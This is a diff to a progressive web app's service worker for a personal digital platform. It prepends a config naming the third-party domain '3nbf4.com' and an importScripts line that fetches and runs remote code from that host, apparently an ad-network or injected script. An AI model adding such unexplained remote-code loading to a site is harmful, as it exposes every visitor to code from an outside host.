@@ -1,3 +1,10 @@
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11465678
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+
 // Service Worker for Waleed Khan Afridi Digital Platform PWA & WebAPK
 const CACHE_NAME = 'wka-digital-v2.5-fast';
 const ASSETS_TO_CACHE = [
